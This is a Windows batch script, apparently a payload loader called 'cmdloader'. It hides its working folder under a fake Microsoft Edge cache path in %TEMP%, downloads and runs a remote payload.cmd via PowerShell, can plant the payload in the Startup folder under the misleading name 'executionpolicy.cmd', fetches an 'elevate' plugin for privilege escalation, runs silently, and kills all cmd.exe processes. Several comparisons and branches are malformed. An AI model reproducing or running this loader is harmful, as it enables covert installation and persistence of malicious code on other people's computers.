@echo off

cd %TEMP%
md .edge
cd .edge
md Microsoft Edge
cd Microsoft Edge
md cache
md userdata
md Default
cd cache
md Downloads
md Bookmarks
md Application
cd Application
if %1==url goto online
if %1==path goto local
goto fail
:online
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/realgamebreaker/cmdloader/main/payload.cmd -OutFile payload.cmd"
goto checkplugins

:local
xcopy C:\Path\to\your\Payload.cmd %TEMP%\.edge\Microsoft Edge\cache\Application\payload.bat -y
goto checkplugins

:checkplugins
if %3==--plugins-beginn goto checkendswitch
if %2==--plugins-beginn goto fail
goto silentrun

:checkendswitch
if %4=--plugins-end goto loadplugins
if %5=--plugins-end goto loadplugins
if %6=--plugins-end goto loadplugins
if %7=--plugins-end goto loadplugins
goto fail

:loadplugins
if %4==-enable:elevate goto elevate
if %5==-enable:elevate goto elevate
if %6==-enable:elevate goto elevate
if %4==-enable:startup goto startup
if %5==-enable:startup goto startup
if %6==-enable:startup xcopy payload.cmd %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\executionpolicy.cmd



:elevate
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/realgamebreaker/cmd-plugins/main/elevate.cmd-plugin -OutFile elevate.plugin.cmd"
goto elevatedrunshutdowncheck
:checksilent
if %2==--silent goto :silentrun
start payload.cmd
goto exit

:silentrun
start /B cmd /C "payload.cmd"
goto exit


:elevatedrunshutdowncheck
if %4==-enable:shutdown start /B cmd /C "elevate.plugin.cmd shutdown" && exit
if %4==-enable:shutdown start /B cmd /C "elevate.plugin.cmd shutdown" && exit
if %4==-enable:shutdown start /B cmd /C "elevate.plugin.cmd shutdown" && exit
goto elevatedrun
:elevatedrun
start /B cmd /C "elevate.plugin.cmd"


:fail
echo.
echo Correct Usage: load.cmd [url/path] (--silent) (--plugins-beginn --enable:plugin --plugins-end)
echo To use plugins you have to use silent mode.
echo You can use 3 plugins at a time.
pause

:exit
taskkill /f /im cmd.exe
